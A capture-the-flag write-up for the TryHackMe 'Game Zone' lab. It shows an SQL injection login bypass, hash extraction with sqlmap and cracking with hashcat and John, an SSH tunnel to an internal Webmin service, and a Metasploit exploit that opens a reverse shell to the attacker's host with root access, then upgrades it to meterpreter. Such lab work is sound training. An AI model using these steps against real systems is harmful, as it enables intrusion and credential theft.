# TryHackMe-Game Zone

## NMAP

```
Nmap scan report for 10.10.76.196
Host is up (0.17s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:ea:89:f1:d4:a7:dc:a5:50:f7:6d:89:c3:af:0b:03 (RSA)
|   256 b3:7d:72:46:1e:d3:41:b6:6a:91:15:16:c9:4a:a5:fa (ECDSA)
|_  256 53:67:09:dc:ff:fb:3a:3e:fb:fe:cf:d8:6d:41:27:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Game Zone
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## PORT 80

<img src="https://imgur.com/FnJSsLy.png"/>

This page is vulnerable to sqli , lets test it using username as `' or 1=1 -- ` and leaving the password blank

<img src="https://imgur.com/xauHhOd.png"/>


<img src="https://imgur.com/sK2T9aI.png"/>

## Burpsuite

Lets use burp to capture the search request on page `portal.php` in order to send it to `sqlmap` to exilftrate data.

<img src="https://imgur.com/H6ANNHE.png"/>

Save the whole request in a text file

<img src="https://imgur.com/fHzH6rm.png"/>

## Sqlmap

<img src="https://imgur.com/pJsE2M3.png"/>

<img src="https://imgur.com/EvMxCDd.png"/>

Obtained sha256 hash `agent47:ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14`

## Hashcat

```
 hashcat -a 0 -m 1400 --user  hash /usr/share/wordlists/rockyou.txt
```
Here -a is the attack mode which is set to `Straight` and -m tells the hashing algorithm in which it is `sha2-256`

```                                              
Session..........: hashcat
Status...........: Cracked
Hash.Name........: SHA2-256
Hash.Target......: ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218...3efd14
Time.Started.....: Thu Nov  5 21:26:24 2020 (1 sec)
Time.Estimated...: Thu Nov  5 21:26:25 2020 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2992.0 kH/s (0.78ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 2891776/14344385 (20.16%)
Rejected.........: 0/2891776 (0.00%)
Restore.Point....: 2887680/14344385 (20.13%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: vikes! -> vida82vida82

```

```
root@kali:~/TryHackMe/Easy/Game Zone# hashcat -a 0 -m 1400 --user --show  hash
agent47:ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14:videogamer124
```

## JohnTheRipper

```
john hash --wordlist=/usr/share/wordlists/rockyou.txt                                                         
Warning: detected hash type "gost", but the string is also recognized as "HAVAL-256-3"                                                              
Use the "--format=HAVAL-256-3" option to force loading these as that type instead                                                                   
Warning: detected hash type "gost", but the string is also recognized as "Panama"                                                                   
Use the "--format=Panama" option to force loading these as that type instead                                                                        
Warning: detected hash type "gost", but the string is also recognized as "po"                                                                       
Use the "--format=po" option to force loading these as that type instead                                                                            
Warning: detected hash type "gost", but the string is also recognized as "Raw-Keccak-256"                                                           
Use the "--format=Raw-Keccak-256" option to force loading these as that type instead                                                                
Warning: detected hash type "gost", but the string is also recognized as "Raw-SHA256"                                                               
Use the "--format=Raw-SHA256" option to force loading these as that type instead                                                                    
Warning: detected hash type "gost", but the string is also recognized as "skein-256"                                                                
Use the "--format=skein-256" option to force loading these as that type instead                                                                     
Warning: detected hash type "gost", but the string is also recognized as "Snefru-256"                                                               
Use the "--format=Snefru-256" option to force loading these as that type instead                                                                    
Warning: detected hash type "gost", but the string is also recognized as "Stribog-256"                                                              
Use the "--format=Stribog-256" option to force loading these as that type instead                                                                   
Using default input encoding: UTF-8                                                                                                                 
Loaded 1 password hash (gost, GOST R 34.11-94 [64/64])                                                                                              
Will run 4 OpenMP threads                                                                                                                           
Press 'q' or Ctrl-C to abort, almost any other key for status                                                                                       
0g 0:00:00:08 DONE (2020-11-05 21:30) 0g/s 1639Kp/s 1639Kc/s 1639KC/s !!12Honey..*7¡Vamos!                                                          
Session completed                                                                           
```

```
john --show --format=RAW-SHA256 hash
agent47:videogamer124

```

So you can use both to crack hashes


## SSH (PORT 22)

Now we have the username `agent47` and passowrd `videogamer124` we can ssh into the box

<img src="https://imgur.com/GANxN0t.png"/>


##  Reverse SSH Port Forwarding

```
Reverse SSH port forwarding specifies that the given port on the remote server host is to be forwarded to the given host and port on the local side.

-L is a local tunnel (YOU <-- CLIENT). If a site was blocked, you can forward the traffic to a server you own and view it. For example, if imgur was blocked at work, you can do ssh -L 9000:imgur.com:80 user@example.com. Going to localhost:9000 on your machine, will load imgur traffic using your other server.

-R is a remote tunnel (YOU --> CLIENT). You forward your traffic to the other server for others to view. Similar to the example above, but in reverse.
```
Run `ss -tulpn` 

```
agent47@gamezone:~$ ss -tulpn
Netid State      Recv-Q Send-Q          Local Address:Port                         Peer Address:Port              
udp   UNCONN     0      0                           *:10000                                   *:*                  
udp   UNCONN     0      0                           *:68                                      *:*                  
tcp   LISTEN     0      80                  127.0.0.1:3306                                    *:*                  
tcp   LISTEN     0      128                         *:10000                                   *:*                  
tcp   LISTEN     0      128                         *:22                                      *:*                  
tcp   LISTEN     0      128                        :::80                                     :::*                  
tcp   LISTEN     0      128                        :::22                                     :::
```

There are `5` tcp ports running 


We can see that a service running on port 10000 is blocked via a firewall rule from the outside (we can see this from the IPtable list). However, Using an SSH Tunnel we can expose the port to us (locally)!

From our local machine, run ssh -L 10000:localhost:10000 <username>@<ip>

Once complete, in your browser type "localhost:10000" and you can access the newly-exposed webserver.


<img src="https://imgur.com/qWggyNe.png"/>

## PORT 10000

<img src="https://imgur.com/53p8cOi.png"/>

Login with the same crdentials (agent47:videogamer124)

<img src="https://imgur.com/9SPdPme.png"/>

## Metasploit

```
msf5 > search webmin  1.580                                               
                                                                                                                                                    
Matching Modules                                                          
================                                                          
                                                                          
   #  Name                                         Disclosure Date  Rank       Check  Description                                                   
   -  ----                                         ---------------  ----       -----  -----------
   0  auxiliary/admin/webmin/edit_html_fileaccess  2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File A
ccess                                                                     
   1  auxiliary/admin/webmin/file_disclosure       2006-06-30       normal     No     Webmin File Disclosure
   2  exploit/linux/http/webmin_backdoor           2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor                           
   3  exploit/linux/http/webmin_packageup_rce      2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution               
   4  exploit/unix/webapp/webmin_show_cgi_exec     2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution                
   5  exploit/unix/webapp/webmin_upload_exec       2019-01-17       excellent  Yes    Webmin Upload Authenticated RCE                               
                                                                                                                                                    
                                                                                                                                                    
Interact with a module by name or index, for example use 5 or use exploit/unix/webapp/webmin_upload_exec                                            
                                                                                                                                                    
msf5 > use 4                                                              

```
```
msf5 exploit(unix/webapp/webmin_show_cgi_exec) > show options                                                                                       
                                                                                                                                                    
Module options (exploit/unix/webapp/webmin_show_cgi_exec):                                                                                          
                                                                          
   Name      Current Setting  Required  Description                                                                                                 
   ----      ---------------  --------  -----------                                                                                                 
   PASSWORD  videogamer124    yes       Webmin Password                                                                                             
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]                                                
   RHOSTS    lo               yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'                          
   RPORT     10000            yes       The target port (TCP)                                                                                       
   SSL       false            yes       Use SSL                                                                                                     
   USERNAME  agent47          yes       Webmin Username                                                                                             
   VHOST                      no        HTTP server virtual host                                                                                    
                                                                          
                                                                                                                                                    
Exploit target:                                                                                                                                     
                                                                          
   Id  Name                                                               
   --  ----                                                               
   0   Webmin 1.580                                                       
                                                                          
                                                                                                                                                    
msf5 exploit(unix/webapp/webmin_show_cgi_exec) > exploit                                                                                            
                                                                          
[-] Exploit failed: An exploitation error occurred.                       
[*] Exploit completed, but no session was created.             
```

This didn't worked because we didn't set the unix payload

`set PAYLOAD cmd/unix/reverse`

```
Module options (exploit/unix/webapp/webmin_show_cgi_exec):      
                                     
   Name      Current Setting  Required  Description                       
   ----      ---------------  --------  -----------                       
   PASSWORD  videogamer124    yes       Webmin Password                   
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]                                                
   RHOSTS    localhost        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'                          
   RPORT     10000            yes       The target port (TCP)                                                                                       
   SSL       false            yes       Use SSL     
   USERNAME  agent47          yes       Webmin Username                   
   VHOST                      no        HTTP server virtual host          
                                     
                                     
Payload options (cmd/unix/reverse):
                                     
   Name   Current Setting  Required  Description                          
   ----   ---------------  --------  -----------                          
   LHOST  10.14.3.143      yes       The listen address (an interface may be specified)                                                             
   LPORT  4444             yes       The listen port                                                                                                
                                                                          
                                                                          
Exploit target:   
                                                                          
   Id  Name        
   --  ----                                                               
   0   Webmin 1.580                                                       
                                     
                                                                                                                                                    
msf5 exploit(unix/webapp/webmin_show_cgi_exec) > exploit                  
[*] Exploiting target 0.0.0.1                                                                 
[*] Started reverse TCP double handler on 10.14.3.143:4444                
[*] Attempting to login...                                                
[-] Authentication failed            
[*] Exploiting target 127.0.0.1      
[*] Started reverse TCP double handler on 10.14.3.143:4444 
[*] Attempting to login...           
[+] Authentication successfully                                           
[+] Authentication successfully                                           
[*] Attempting to execute the payload...                                                                                                            
[+] Payload executed successfully                                                                                                                   
[*] Accepted the first client connection...                                                                                                         
[*] Accepted the second client connection...                              
[*] Command: echo IMGwgkPDtJucxdvk;                                       
[*] Writing to socket A                                                   
[*] Writing to socket B                                                   
[*] Reading from sockets...                                               
[*] Reading from socket A                                                 
[*] A: "IMGwgkPDtJucxdvk\r\n"                                             
[*] Matching...                                                                                                                                     
[*] B is input...                                                                                                                                   
[*] Command shell session 1 opened (10.14.3.143:4444 -> 10.10.76.196:40646) at 2020-11-05 22:49:31 +0500                                            
[*] Session 1 created in the background.                                  

```
```
msf5 exploit(unix/webapp/webmin_show_cgi_exec) > sessions

Active sessions
===============

  Id  Name  Type            Information  Connection
  --  ----  ----            -----------  ----------
  1         shell cmd/unix               10.14.3.143:4444 -> 10.10.76.196:40646 (127.0.0.1)

msf5 exploit(unix/webapp/webmin_show_cgi_exec) > sessions -i 1
[*] Starting interaction with 1...

pwd 
/usr/share/webmin/file/
id
uid=0(root) gid=0(root) groups=0(root)

```
## Upgrading shell to meterpreter

```
[*] Upgrading session ID: 1
pwd
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.14.3.143:4433 
[*] Sending stage (980808 bytes) to 10.10.76.196
[*] Meterpreter session 2 opened (10.14.3.143:4433 -> 10.10.76.196:44438) at 2020-11-05 22:57:31 +0500
[*] Command stager progress: 100.00% (773/773 bytes)
[*] Post module execution completed
msf5 post(multi/manage/shell_to_meterpreter) > pwd
[*] exec: pwd

/root/TryHackMe/Easy/Game Zone
msf5 post(multi/manage/shell_to_meterpreter) > sessions 

Active sessions
===============

  Id  Name  Type                   Information                                                       Connection
  --  ----  ----                   -----------                                                       ----------
  1         shell cmd/unix                                                                           10.14.3.143:4444 -> 10.10.76.196:40646 (127.0.0
.1)
  2         meterpreter x86/linux  no-user @ gamezone (uid=0, gid=0, euid=0, egid=0) @ 10.10.76.196  10.14.3.143:4433 -> 10.10.76.196:44438 (10.10.7
6.196)

msf5 post(multi/manage/shell_to_meterpreter) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > pwd
/root
meterpreter > whoami
[-] Unknown command: whoami.
meterpreter > getuid
Server username: no-user @ gamezone (uid=0, gid=0, euid=0, egid=0)
meterpreter > 

```